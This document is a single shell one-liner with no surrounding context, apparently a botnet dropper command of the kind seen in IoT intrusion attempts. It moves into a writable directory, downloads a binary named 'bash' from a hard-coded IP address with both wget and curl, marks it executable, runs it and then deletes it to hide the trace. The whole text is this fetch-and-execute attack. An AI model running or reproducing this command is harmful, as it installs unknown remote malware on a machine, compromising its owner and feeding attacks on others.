cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.155.113.105/bash; curl -O http://107.155.113.105/bash; chmod +x bash; ./bash; rm -rf bash
